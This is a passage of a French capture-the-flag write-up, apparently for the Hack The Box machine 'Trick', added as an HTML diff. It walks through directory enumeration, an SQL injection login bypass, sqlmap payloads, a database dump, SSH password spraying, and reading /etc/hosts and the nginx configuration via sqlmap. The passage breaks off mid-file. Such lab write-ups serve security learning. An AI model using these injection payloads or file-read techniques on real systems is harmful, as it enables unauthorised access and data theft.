+        data-srcset="/images/Trick/Trick-4.png, /images/Trick/Trick-4.png 1.5x, /images/Trick/Trick-4.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-4.png"
+        title="/images/Trick/Trick-4.png" width="1920" height="961" /></p>
+<h2 id="shell-as-michael">Shell as Michael</h2>
+<h3 id="dirsearch-1">dirsearch</h3>
+<p>Je trouve quelques fichiers intéressants.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  dirsearch -u http://preprod-payroll.trick.htb/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  _<span class="p">|</span>. _ _  _  _  _ _<span class="p">|</span>_    v0.4.3
+</span></span><span class="line"><span class="cl"> <span class="o">(</span>_<span class="o">||</span><span class="p">|</span> _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span> <span class="o">(</span>_<span class="p">|</span> <span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Extensions: php, asp, aspx, jsp, html, htm <span class="p">|</span> HTTP method: GET <span class="p">|</span> Threads: <span class="m">25</span> <span class="p">|</span> Wordlist size: <span class="m">12289</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://preprod-payroll.trick.htb/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>19:03:48<span class="o">]</span> Scanning:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>19:03:53<span class="o">]</span> <span class="m">200</span> -     0B - /ajax.php
+</span></span><span class="line"><span class="cl"><span class="o">[</span>19:03:53<span class="o">]</span> <span class="m">301</span> -   185B - /assets  -&gt;  http://preprod-payroll.trick.htb/assets/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>19:03:53<span class="o">]</span> <span class="m">403</span> -   571B - /assets/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>19:03:55<span class="o">]</span> <span class="m">301</span> -   185B - /database  -&gt;  http://preprod-payroll.trick.htb/database/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>19:03:55<span class="o">]</span> <span class="m">403</span> -   571B - /database/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>19:03:56<span class="o">]</span> <span class="m">200</span> -    2KB - /header.php
+</span></span><span class="line"><span class="cl"><span class="o">[</span>19:03:56<span class="o">]</span> <span class="m">200</span> -   486B - /home.php
+</span></span><span class="line"><span class="cl"><span class="o">[</span>19:03:56<span class="o">]</span> <span class="m">302</span> -    9KB - /index.php  -&gt;  login.php
+</span></span><span class="line"><span class="cl"><span class="o">[</span>19:03:57<span class="o">]</span> <span class="m">200</span> -    5KB - /login.php
+</span></span><span class="line"><span class="cl"><span class="o">[</span>19:03:59<span class="o">]</span> <span class="m">200</span> -   149B - /readme.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>19:04:00<span class="o">]</span> <span class="m">200</span> -    2KB - /users.php</span></span></code></pre></div></div>
+<p>La page <code>users.php</code> affiche l&rsquo;utilisateur <code>Administrator</code> et son username qui est <code>Enemigosss</code>. Cette page est statique.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-6.png"
+        data-srcset="/images/Trick/Trick-6.png, /images/Trick/Trick-6.png 1.5x, /images/Trick/Trick-6.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-6.png"
+        title="/images/Trick/Trick-6.png" width="667" height="229" /></p>
+<p>La page <code>readme.txt</code> n&rsquo;affiche qu&rsquo;un lien de téléchargement d&rsquo;une image.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-7.png"
+        data-srcset="/images/Trick/Trick-7.png, /images/Trick/Trick-7.png 1.5x, /images/Trick/Trick-7.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-7.png"
+        title="/images/Trick/Trick-7.png" width="875" height="157" /></p>
+<p>Le lien redirige vers cette photo présente sur la page de connexion.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-8.png"
+        data-srcset="/images/Trick/Trick-8.png, /images/Trick/Trick-8.png 1.5x, /images/Trick/Trick-8.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-8.png"
+        title="/images/Trick/Trick-8.png" width="670" height="457" /></p>
+<h3 id="sql-injection">SQL Injection</h3>
+<p>J&rsquo;intercepte la requête après une tentative de connexion. Je change alors la valeur de champ username par <code>'</code> et j&rsquo;ai une erreur. On dirait bien que je me dirige vers une Injection SQL.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-5.png"
+        data-srcset="/images/Trick/Trick-5.png, /images/Trick/Trick-5.png 1.5x, /images/Trick/Trick-5.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-5.png"
+        title="/images/Trick/Trick-5.png" width="1464" height="507" /></p>
+<p>Je confirme la SQL Injection avec le payload basique <code>admin' or 1=1; -- -</code>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-9.png"
+        data-srcset="/images/Trick/Trick-9.png, /images/Trick/Trick-9.png 1.5x, /images/Trick/Trick-9.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-9.png"
+        title="/images/Trick/Trick-9.png" width="611" height="332" /></p>
+<p>Ce payload me permet de bypasser l&rsquo;authentification et d&rsquo;obtenir une connexion en tant qu&rsquo;administrateur.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-10.png"
+        data-srcset="/images/Trick/Trick-10.png, /images/Trick/Trick-10.png 1.5x, /images/Trick/Trick-10.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-10.png"
+        title="/images/Trick/Trick-10.png" width="1920" height="600" /></p>
+<p>Il n&rsquo;y a qu&rsquo;une seul utilisateur.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-11.png"
+        data-srcset="/images/Trick/Trick-11.png, /images/Trick/Trick-11.png 1.5x, /images/Trick/Trick-11.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-11.png"
+        title="/images/Trick/Trick-11.png" width="1920" height="509" /></p>
+<p>Le mot de passe est caché. Sûrement avec du CSS avec une propriété <code>hidden</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-12.png"
+        data-srcset="/images/Trick/Trick-12.png, /images/Trick/Trick-12.png 1.5x, /images/Trick/Trick-12.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-12.png"
+        title="/images/Trick/Trick-12.png" width="1048" height="610" /></p>
+<p>Je trouve le mot de passe dans le code source de la page web.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username : Enemigosss
+</span></span><span class="line"><span class="cl">password : SuperGucciRainbowCake</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-13.png"
+        data-srcset="/images/Trick/Trick-13.png, /images/Trick/Trick-13.png 1.5x, /images/Trick/Trick-13.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-13.png"
+        title="/images/Trick/Trick-13.png" width="937" height="187" /></p>
+<p>Dans la liste des employés se trouve John Smith.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-14.png"
+        data-srcset="/images/Trick/Trick-14.png, /images/Trick/Trick-14.png 1.5x, /images/Trick/Trick-14.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-14.png"
+        title="/images/Trick/Trick-14.png" width="1920" height="508" /></p>
+<p>Je teste alors le mot de passe trouvé sur les utilisateurs jusque là recensée mais cela ne donne rien.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  nxc ssh trick.htb -u enemigosss -p SuperGucciRainbowCake
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>-<span class="o">]</span> enemigosss:SuperGucciRainbowCake
+</span></span><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  nxc ssh trick.htb -u Enemigosss -p SuperGucciRainbowCake
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>-<span class="o">]</span> Enemigosss:SuperGucciRainbowCake
+</span></span><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  nxc ssh trick.htb -u john -p SuperGucciRainbowCake
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>-<span class="o">]</span> john:SuperGucciRainbowCake</span></span></code></pre></div></div>
+<h3 id="read-database">Read Database</h3>
+<p>Avec <code>sqlmap</code>, je vois que le paramètre <code>username</code> est vulnérable à une Time Based Union SQLI, une Boolean-based blind SQLI ainsi qu&rsquo;une time-based SQLI.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  sqlmap -r trick.req --batch --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span>
+</span></span><span class="line"><span class="cl">--SNIP--
+</span></span><span class="line"><span class="cl">POST parameter <span class="s1">&#39;username&#39;</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">[</span>y/N<span class="o">]</span> N
+</span></span><span class="line"><span class="cl">sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of <span class="m">602</span> HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">Parameter: username <span class="o">(</span>POST<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    Type: boolean-based blind
+</span></span><span class="line"><span class="cl">    Title: OR boolean-based blind - WHERE or HAVING clause <span class="o">(</span>NOT<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    Payload: <span class="nv">username</span><span class="o">=</span>admin<span class="s1">&#39; OR NOT 4171=4171-- ooPa&amp;password=admin
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">    Type: error-based
+</span></span></span><span class="line"><span class="cl"><span class="s1">    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+</span></span></span><span class="line"><span class="cl"><span class="s1">    Payload: username=admin&#39;</span> OR <span class="o">(</span>SELECT <span class="m">1092</span> FROM<span class="o">(</span>SELECT COUNT<span class="o">(</span>*<span class="o">)</span>,CONCAT<span class="o">(</span>0x716b707a71,<span class="o">(</span>SELECT <span class="o">(</span>ELT<span class="o">(</span><span class="nv">1092</span><span class="o">=</span>1092,1<span class="o">)))</span>,0x7162706a71,FLOOR<span class="o">(</span>RAND<span class="o">(</span>0<span class="o">)</span>*2<span class="o">))</span>x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x<span class="o">)</span>a<span class="o">)</span>-- rYPn<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>admin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Type: time-based blind
+</span></span><span class="line"><span class="cl">    Title: MySQL &gt;<span class="o">=</span> 5.0.12 AND time-based blind <span class="o">(</span>query SLEEP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    Payload: <span class="nv">username</span><span class="o">=</span>admin<span class="s1">&#39; AND (SELECT 1135 FROM (SELECT(SLEEP(5)))SMpk)-- dfHv&amp;password=admin
+</span></span></span><span class="line"><span class="cl"><span class="s1">---
+</span></span></span><span class="line"><span class="cl"><span class="s1">[19:46:29] [INFO] the back-end DBMS is MySQL
+</span></span></span><span class="line"><span class="cl"><span class="s1">web application technology: Nginx 1.14.2
+</span></span></span><span class="line"><span class="cl"><span class="s1">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
+</span></span></span><span class="line"><span class="cl"><span class="s1">[19:46:29] [INFO] fetched data logged to text files under &#39;</span>/root/.local/share/sqlmap/output/preprod-payroll.trick.htb<span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>19:46:29<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> your sqlmap version is outdated
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ending @ 19:46:29 /2025-10-01/</span></span></code></pre></div></div>
+<p>Je récupère les bases de données en utilisant une Boolean based SQL Injection.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  sqlmap -r trick.req --batch --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> --technique<span class="o">=</span>B --dbs
+</span></span><span class="line"><span class="cl">--SNIP--
+</span></span><span class="line"><span class="cl">available databases <span class="o">[</span>2<span class="o">]</span>:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> information_schema
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> payroll_db</span></span></code></pre></div></div>
+<p>Je récupère les tables de la base de données <code>payroll_db</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  sqlmap -r trick.req --batch --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> --technique<span class="o">=</span>B -D payroll_db --tables
+</span></span><span class="line"><span class="cl">--SNIP--
+</span></span><span class="line"><span class="cl">Database: payroll_db
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="m">11</span> tables<span class="o">]</span>
+</span></span><span class="line"><span class="cl">+---------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> position            <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> allowances          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> attendance          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> deductions          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> department          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> employee            <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> employee_allowances <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> employee_deductions <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> payroll             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> payroll_items       <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> users               <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+---------------------+</span></span></code></pre></div></div>
+<p>Je ne trouve que les identifiants de l&rsquo;administrateur dans la base de données.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  sqlmap -r trick.req --batch --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> --technique<span class="o">=</span>B -D payroll_db -T users --dump
+</span></span><span class="line"><span class="cl">--SNIP--
+</span></span><span class="line"><span class="cl">Database: payroll_db
+</span></span><span class="line"><span class="cl">Table: users
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="m">1</span> entry<span class="o">]</span>
+</span></span><span class="line"><span class="cl">+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> id <span class="p">|</span> doctor_id <span class="p">|</span> name          <span class="p">|</span> <span class="nb">type</span>   <span class="p">|</span> address <span class="p">|</span> contact <span class="p">|</span> password              <span class="p">|</span> username   <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> <span class="m">0</span>         <span class="p">|</span> Administrator <span class="p">|</span> <span class="m">1</span>      <span class="p">|</span> &lt;blank&gt; <span class="p">|</span> &lt;blank&gt; <span class="p">|</span> SuperGucciRainbowCake <span class="p">|</span> Enemigosss <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----+-----------+---------------+--------+---------+---------+-----------------------+------------+</span></span></code></pre></div></div>
+<h3 id="read-files-with-sqlmap">Read Files with sqlmap</h3>
+<p>Je peux lire des fichiers avec l&rsquo;option <code>-file-read</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  sqlmap -r trick.req --batch --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> -file-read<span class="o">=</span>/etc/hosts
+</span></span><span class="line"><span class="cl">--SNIP--
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_hosts <span class="o">(</span>same file<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:06:07<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetched data logged to text files under <span class="s1">&#39;/root/.local/share/sqlmap/output/preprod-payroll.trick.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:06:07<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> your sqlmap version is outdated
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ending @ 20:06:07 /2025-10-01/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_hosts
+</span></span><span class="line"><span class="cl">127.0.0.1 localhost
+</span></span><span class="line"><span class="cl">127.0.1.1 trick</span></span></code></pre></div></div>
+<p>Je vois que je peux lire le fichier de configuration principal de <code>nginx</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  sqlmap -r trick.req --batch --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> -file-read<span class="o">=</span>/etc/nginx/nginx.conf
+</span></span><span class="line"><span class="cl">--SNIP--
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:08:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the <span class="nb">local</span> file <span class="s1">&#39;/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf&#39;</span> and the remote file <span class="s1">&#39;/etc/nginx/nginx.conf&#39;</span> have the same size <span class="o">(</span><span class="m">1482</span> B<span class="o">)</span>
+</span></span><span class="line"><span class="cl">files saved to <span class="o">[</span>1<span class="o">]</span>:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf <span class="o">(</span>same file<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:08:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetched data logged to text files under <span class="s1">&#39;/root/.local/share/sqlmap/output/preprod-payroll.trick.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:08:04<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> your sqlmap version is outdated
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ending @ 20:08:04 /2025-10-01/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf
+</span></span><span class="line"><span class="cl">user www-data<span class="p">;</span>
+</span></span><span class="line"><span class="cl">worker_processes auto<span class="p">;</span>
+</span></span><span class="line"><span class="cl">pid /run/nginx.pid<span class="p">;</span>
+</span></span><span class="line"><span class="cl">include /etc/nginx/modules-enabled/*.conf<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">events <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        worker_connections 768<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># multi_accept on;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">http <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">##</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Basic Settings</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">##</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        sendfile on<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        tcp_nopush on<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        tcp_nodelay on<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        keepalive_timeout 65<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        types_hash_max_size 2048<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># server_tokens off;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># server_names_hash_bucket_size 64;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># server_name_in_redirect off;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        include /etc/nginx/mime.types<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        default_type application/octet-stream<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">##</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># SSL Settings</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">##</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2<span class="p">;</span> <span class="c1"># Dropping SSLv3, ref: POODLE</span>
+</span></span><span class="line"><span class="cl">        ssl_prefer_server_ciphers on<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">##</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Logging Settings</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">##</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        access_log /var/log/nginx/access.log<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        error_log /var/log/nginx/error.log<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">##</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Gzip Settings</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">##</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        gzip on<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># gzip_vary on;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># gzip_proxied any;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># gzip_comp_level 6;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># gzip_buffers 16 8k;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># gzip_http_version 1.1;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">##</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Virtual Host Configs</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">##</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        include /etc/nginx/conf.d/*.conf<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        include /etc/nginx/sites-enabled/*<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#mail {</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#       # See sample authentication script at:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#       # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#       # auth_http localhost/auth.php;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#       # pop3_capabilities &#34;TOP&#34; &#34;USER&#34;;</span>
